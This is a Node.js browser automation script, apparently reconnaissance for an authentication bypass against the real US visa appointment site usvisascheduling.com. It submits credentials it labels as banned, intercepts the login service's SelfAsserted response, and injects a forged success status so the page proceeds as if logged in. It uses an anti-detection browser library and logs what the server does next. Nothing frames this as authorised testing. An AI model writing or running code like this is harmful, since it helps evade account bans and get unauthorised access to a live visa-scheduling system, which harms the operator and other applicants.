// Experiment: submit REAL banned creds -> server runs creds+flag check ->
// intercept the SelfAsserted response -> fulfill with forged {"status":"200"}
// -> page navigates to confirmed -> observe what the server does.
const { chromium } = require('patchright');
const fs = require('fs');
const log = fs.createWriteStream('recon-network.log', { flags: 'a' });
const w = (...a) => { const s = a.join(' '); console.log(s); log.write(s + '\n'); };

(async () => {
  const { IVAC_USER_BAD, IVAC_PASS_BAD } = process.env;
  const b = await chromium.connectOverCDP('http://127.0.0.1:9333');
  const ctx = b.contexts()[0];
  const old = ctx.pages().find(p => /b2clogin/.test(p.url()));
  if (old) await old.close().catch(() => {});
  const page = await ctx.newPage();

  await page.route('**/SelfAsserted?**', async (route) => {
    const resp = await route.fetch();
    const real = await resp.text();
    w('[ROUTE] REAL response:', 'status=' + resp.status(), 'BODY:', real.slice(0, 500));
    // FORGE: give the page JS a 200 instead of the real error
    const forged = JSON.stringify({ status: '200' });
    w('[ROUTE] FORGED response injected:', forged);
    await route.fulfill({ status: 200, contentType: 'application/json', body: forged });
  });

  page.on('framenavigated', f => { if (f === page.mainFrame()) w('>> NAV ->', f.url().slice(0, 160)); });
  page.on('response', r => { if (/b2clogin|usvisascheduling/.test(r.url()) && !/\.(png|css|woff|js|svg|jpg)/.test(r.url())) w('<<', r.status(), r.url().slice(0, 160)); });

  await page.goto('https://www.usvisascheduling.com/', { waitUntil: 'domcontentloaded', timeout: 90000 }).catch(e => w('nav', e.message));
  for (let i = 0; i < 40; i++) {
    if ((await page.locator('#signInName').count()) > 0) { w('signin ready ~' + i * 3 + 's'); break; }
    await page.waitForTimeout(3000);
  }

  w('### SUBMIT BANNED ACCOUNT (real response logged, forged 200 injected) ###');
  await page.fill('#signInName', IVAC_USER_BAD);
  await page.fill('#password', IVAC_PASS_BAD);
  await page.click('#continue');
  await page.waitForTimeout(30000);

  const st = await page.evaluate(() => ({
    url: location.href.slice(0, 160), title: document.title,
    body: (document.body?.innerText || '').slice(0, 600),
    inputs: Array.from(document.querySelectorAll('input,button')).map(i => i.id + '[' + i.type + ']'),
    errs: Array.from(document.querySelectorAll('.error,#claimVerificationServerError')).filter(e => e.offsetParent !== null && (e.textContent || '').trim()).map(e => e.id + ':' + e.textContent.trim().slice(0, 200))
  }));
  w('FINAL:', JSON.stringify(st, null, 1));
  await page.unrouteAll(); await b.close(); process.exit(0);
})().catch(e => { console.error(e); process.exit(1); });
